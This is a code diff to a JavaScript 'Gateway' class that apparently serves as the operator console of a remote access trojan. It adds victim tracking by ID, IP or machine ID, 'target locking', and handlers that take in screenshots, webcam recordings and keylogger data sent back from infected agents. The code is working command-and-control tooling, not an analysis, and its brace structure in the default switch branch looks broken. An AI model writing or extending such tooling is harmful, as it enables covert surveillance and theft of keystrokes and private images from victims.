@@ -8,6 +8,11 @@ export class Gateway{
      * @param {Function} callbacks.onMessage
      * @param {Function} callbacks.onError 
      * @param {Function} callbacks.onAuthSuccess 
+     * @param {Function} callbacks.onAgentListUpdate
+     * @param {Function} callbacks.onScreenshot     
+     * @param {Function} callbacks.onCamera        
+     * @param {Function} callbacks.onKeylog         
+     * @param {Function} callbacks.onMessage
      */
 
     constructor(callbacks = {}) {
@@ -17,10 +22,21 @@ export class Gateway{
         this.machineId = this._getMachineId();
         this.targetId = 'ALL';
 
-        this.ui = window.ui || {
-            renderList: (title, list) => console.table(list),
-            log: (src, msg) => console.log(`[${src}] ${msg}`)
-        };
+this.ui = window.ui || { log: console.log, renderList: console.table };
+
+        this.agentsList = [];
+    }
+
+    findAgentId(input) {
+        if (input === 'ALL') return 'ALL';
+        
+        const agent = this.agentsList.find(a => 
+            a.id === input || 
+            a.ip === input || 
+            a.machineId === input
+        );
+
+        return agent ? agent.id : null;
     }
 
     _getMachineId() {
@@ -125,9 +141,16 @@ export class Gateway{
         this.ws.send(JSON.stringify(payload));
     }
 
-    setTarget(id) {
-        this.targetId = id;
-        console.log(`[Gateway] Target set to: ${id}`);
+    setTarget(input) {
+        const realId = this.findAgentId(input);
+        
+        if (realId) {
+            this.targetId = realId;
+            console.log(`[Gateway] Target locked: ${realId} (Matched: ${input})`);
+        } else {
+            console.warn(`[Gateway] Could not find agent with Name/IP/ID: ${input}`);
+            console.log("Available Agents:", this.agentsList);
+        }
     }
 
     refreshAgents() {
@@ -163,6 +186,7 @@ export class Gateway{
             let msg;
             try { msg = JSON.parse(event.data); } 
             catch { msg = { type: 'raw', data: event.data }; }
+            const senderId = msg.from;
 
             switch (msg.type) {
                 case CONFIG.CMD.AUTH:
@@ -178,6 +202,9 @@ export class Gateway{
                     }
                     break;
                 case CONFIG.CMD.GET_AGENTS:
+                    this.agentsList = msg.data; 
+                    console.table(this.agentsList);
+
                     if (this.callbacks.onAgentListUpdate) {
                         this.callbacks.onAgentListUpdate(msg.data) // array [agent, agent]
                     } 
@@ -195,17 +222,35 @@ export class Gateway{
                     this._handleCommandResult(msg.type, msg.data);
                     break;
                 case CONFIG.CMD.SCREENSHOT:
-                    console.log(`[Data] Received Screenshot from ${sender}`)
+                    if (msg.data && msg.data.status === 'ok') {
+                        console.log(`[Gateway] Screenshot received from ${senderId}`);
+                        if (this.callbacks.onScreenshot) {
+                            this.callbacks.onScreenshot(msg.data.data, senderId);
+                        }
+                    }
+                    break;
+                case CONFIG.CMD.CAM_RECORD:
+                    if (msg.data && msg.data.status === 'ok') {
+                        console.log(`[Gateway] Camera video received from ${senderId}`);
+                        if (this.callbacks.onCamera) {
+                            this.callbacks.onCamera(msg.data.data, senderId);
+                        }
+                    }
+                    break;
+                case CONFIG.CMD.START_KEYLOG:
+                    if (this.callbacks.onKeylog) {
+                        this.callbacks.onKeylog(msg.data, senderId);
+                    }
+                    break;
                 case CONFIG.CMD.ERROR:
                     console.error("[Server Error]", msg.data);
                     this.ui.log('Error', typeof msg.data === 'string' ? msg.data : msg.data.msg);
                     break;
                 default:
                     this.ui.log('Server', JSON.stringify(msg.data));
+                    if(this.callbacks.onMessage) {
+                    this.callbacks.onMessage(msg);
             }
-
-            if(this.callbacks.onMessage) {
-                this.callbacks.onMessage(msg);
             }
 
         } catch (e) {
